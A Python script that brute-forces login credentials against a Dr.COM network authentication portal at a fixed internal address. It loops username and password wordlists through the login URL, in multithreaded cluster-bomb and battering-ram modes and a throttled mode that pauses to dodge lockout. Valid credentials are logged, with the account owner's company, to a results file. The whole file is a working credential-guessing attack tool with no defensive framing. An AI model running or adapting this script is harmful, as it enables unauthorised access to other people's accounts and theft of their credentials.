import json
import re
import threading
import time

import requests

import verify

file1 = open('username.txt', mode='r', encoding='utf-8')
file2 = open('password.txt', mode='r', encoding='utf-8')


def dump_username():
    dic_username = file1.readlines()
    for i in range(len(dic_username)):
        dic_username[i] = dic_username[i].strip('\n')
    return dic_username


def dump_password():
    dic_password = file2.readlines()
    for i in range(len(dic_password)):
        dic_password[i] = dic_password[i].strip('\n')
    return dic_password


def brute(session, username: str, password: str):
    try:
        session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
    except:
        session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
    url = 'http://10.255.0.19/drcom/login?callback=dr1003&DDDDD=' + username + '&upass=' + password + '&0MKKey=123456&R1=0&R3=0&R6=0&para=00&v6ip=&v='
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
               'Referer': 'http://10.255.0.19/a79.htm'}
    try:
        r = session.get(url=url, headers=headers, verify=False)
    except:
        time.sleep(1)
        r = session.get(url=url, headers=headers, verify=False)
    print(str(r.status_code) + '\t' + str(len(r.text)) + '\t' +
          username + '\t' + password + '\t', end='\t')
    s = re.findall(r'\((.*?)\)', r.text)
    j = json.loads(s[0])
    # print(j)
    status = j['result']
    print(status)
    if status == 1:
        try:
            session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
        except:
            time.sleep(1)
            session.get('http://10.255.0.19/drcom/logout?callback=dr1002&v=')
        company = verify.get_company(session, username, password)
        # print(str(status) + company, end='\n')
        with open('result.txt', mode='a+') as f:
            if company == None:
                f.write(username + '\t' + password + '\n')
            else:
                f.write(username + '\t' + password + '\t' + company + '\n')


def choose_mode(mode: int):
    dic_username = dump_username()
    dic_password = dump_password()
    session = requests.session()
    if mode == 1:
        for username in dic_username:
            for password in dic_password:
                brute(session, username, password)
                # t = threading.Thread(target=brute, args=(session, username, password))
                # t.start()
                # time.sleep(0.05)
    elif mode == 2:
        for username in dic_username:
            i = 0
            for password in dic_password:
                t = threading.Thread(target=brute, args=(session, username, dic_password[i]))
                i += 1
                # 设置轮回数
                if i == 122:
                    for j in range(i):
                        dic_password.pop(0)
                    break
                t.start()
                time.sleep(0.005)
    elif mode == 3:
        for username in dic_username:
            t = threading.Thread(target=brute, args=(session, username, dic_password[0]))
            dic_password.pop(0)
            t.start()
            time.sleep(0.005)
    elif mode == 4:
        i = 0
        for username in dic_username:
            for password in dic_password:
                brute(session, username, password)
                time.sleep(0.005)
                i = i + 1
                if i == 124:
                    tmp = password
                    i = 1
                    time.sleep(805)
                    brute(session, username, tmp)


if __name__ == '__main__':
    # mode=1,2:cluster bomb
    # mode=3:battering ram
    # mode=4:single thread
    choose_mode(1)
